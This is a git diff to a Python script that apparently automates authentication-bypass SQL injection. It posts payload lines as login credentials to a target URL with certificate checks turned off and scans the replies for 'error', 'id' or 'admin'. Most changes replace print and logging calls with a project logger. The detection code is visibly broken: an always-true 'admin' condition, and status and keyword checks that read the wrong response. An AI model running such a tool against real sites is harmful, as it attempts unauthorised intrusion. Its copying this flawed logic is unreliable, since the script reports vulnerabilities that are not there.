@@ -4,12 +4,28 @@ import re
 import requests
 from colorama import Fore,init
 from datetime import datetime
-# import sock
-# from database import create_database_for_Captures
 import sqlite3
 import logging
 import json
 import sys
+add_directory = os.path.abspath(os.path.dirname(__file__))
+
+priority_path = os.path.join(add_directory, '..', 'priority')
+
+sys.path.append(priority_path)
+
+
+from Priority import PRIORITY, HARMFULL
+
+
+current_directory = os.path.dirname(os.path.abspath(__file__))
+project_root = os.path.abspath(os.path.join(current_directory, '..', '..'))
+
+# Add the project root directory to the Python path
+sys.path.append(project_root)
+
+# Now you should be able to import logs
+from logger.logs import logger
 
 
 ############################################################################
@@ -46,14 +62,12 @@ async def auth_SQL_inj_json(urls):
             rows = payload.split("\n") 
             sorted_rows = sorted(rows) 
             sorted_payload = "\n".join(sorted_rows)
-            # json_data = json.dump(sorted_payload)
             print(f"[{datetime.now()}]",Fore.RED + str(sorted_payload)) 
             requests.packages.urllib3.disable_warnings()  #! Disable SSL warnings for http requests and testing
-            # url = "https://redtiger.labs.overthewire.org/level1.php"
             req = requests.get(url=urls,verify=False) 
             if req.status_code == 200: 
                 ask = input(f"[{datetime.now()}]"+Fore.GREEN + f"Looks like the host is up with the url: {urls}\n Do you want to send the above payload to the website? ")
-                logging.info(f"the host{urls} is up and returned status code with 200,Time:{datetime.now()}")
+                logger.info(f"The website:{urls} is returning 200 status code.\n\n")
 
                 if ask.lower() == "y": 
                     for line in sorted_payload.split("\n"):
@@ -64,38 +78,33 @@ async def auth_SQL_inj_json(urls):
                         }
                         
                         inp = input(Fore.RESET+Fore.LIGHTBLUE_EX+f"JSON payload:\nf{params['username']}\n{params['password']} \npress enter to send the json data to the server:\n press any key to send payloads auto.")
-                        logging.info(f"Preparing the json payload data to send to the url:{urls},Attack:{attack_type},time:{datetime.now()}")
+                        logger.info(f"Testing payload:{json.dumps(line)}")
                         if inp:
                             ##############################################################################
-                            ack = requests.post(url=urls, data=params,verify=False) 
-                            print(f"[{datetime.now()}]","|Current payload: |", params ,"|with status code|:",ack.status_code) #* prints the current status code with its payload
+                            ack = requests.post(url=urls, data=params,verify=False)
+                            logger.info(f"Testing payload:{json.dumps(line)}") 
                             await asyncio.sleep(5) 
                             if "error" in ack.text: 
-                                print(f"[{datetime.now()}]",Fore.RED + "|Vulnerability found|:", ack.text)
-                                logging.info(f"Could find the error word in the text response in the target:{urls}.This may indicates that it has some vulnerability in the backend.Time captured:{datetime.now()}")
+                                logger.info(f"Could find parameter Error,keyword:{json.dumps(line)}")
                                 
                             vuln = re.findall(pattern=pattern,string=ack.text,flags=re.IGNORECASE)
                             htmlVULN = re.findall(pattern=htmlpattern,string=ack.text,flags=re.IGNORECASE) 
                             if vuln: 
-                                print(f"[{datetime.now()}]",Fore.RED + " | Vulnerability found Status: |", ack.text," | with the count of: |",len(vuln),"|Attack:|"+"|authentication bypass SQL injection|")
-                                logging.info(f"Could find vulnerability in the target:{urls}.This might not be accurate.Time:{datetime.now()}.testing parameters:(id,error)")
+                                logging.info(f"Could find parameter id,keyword:{json.dumps(line)}")
                                 await asyncio.sleep(3) 
                             
                             if htmlVULN:
-                                print(f"[{datetime.now()}]",Fore.RED + "|Vulnerability found:|", ack.text,"|with the count of|:",len(htmlVULN))
-                                logging.info(f"Could find vulnerability in the html response in the target(id,error): {urls}.Time captures:{datetime.now()}")
+                                logger.info(f"Could find error parameter, keyword:{json.dumps(line)}")
                                 await asyncio.sleep(3)
                             
                             word = "id" in req.text 
                             errword = "error" in req.text
                             if word:
-                                print(f"[{datetime.now()}]",Fore.GREEN + "|Vulnerability found with the rows Status:|:", word if word is True else "|Nothing found with the error basic attack|","|Attack:|","authentication bypass SQL injection")
-                                logging.info(f"Could find some testing parameters(id) in the target url:{urls},Time captured:{datetime.now()}")
+                                logger.info(f"Could find parameter id, keyword:{json.dumps(line)}")
                                 await asyncio.sleep(3)
                             
                             if errword:
-                                print(f"[{datetime.now()}]",Fore.RED + "|Vulnerability found in the Error based attack Status|:","|" ,errword if errword is True else "|Nothing found with the error basic attack|","|Attack:|","authentication bypass SQL injection")
-                                logging.info(f"Could find some testing parameters that appears to be injectable in the target(error):target:{urls},Time captured:{datetime.now()}")
+                                logger.info(f"Could find parameter error, keyword:{json.dumps(line)}")
                                 await asyncio.sleep(3)
                         
                         elif inp == "esc":
@@ -113,13 +122,11 @@ async def auth_SQL_inj_json(urls):
                             
                                 
                         if req.status_code == 302: 
-                            print(f"[{datetime.now()}]",Fore.GREEN+"[INFO]Could found injectable area on the website with the keyword:","|",line,"|"+"|Attack:|"+"authentication bypass SQL injection")
-                            logging.info(f"[INFO]Could found injectable area on the website with the keyword:{line},Time captured:{datetime.now()},attack:{attack_type}")
+                            logger.info(f"Could inject parameter,keyword:{json.dumps(line)},target:{urls}")
                             done = True
                         
                         if "Admin" or "admin" in vuln or "Admin" or "admin" in ack.text or "Admin" or "admin" in htmlVULN:
-                            print(f"[{datetime.now()}]",Fore.GREEN+"[INFO]Could connect to the website but did found injectable area on the website.","|Attack:|","authentication bypass SQL injection")
-                            logging.info(f"Could connect but found (admin) parameters in the target.attack:{attack_type},Time:{datetime.now()}")
+                            logger.info(f"Could find parameter admin,keyword:{json.dumps(line)},target:{urls}")
                             
                 elif ask.lower() == "n":
                     sys.exit(0)
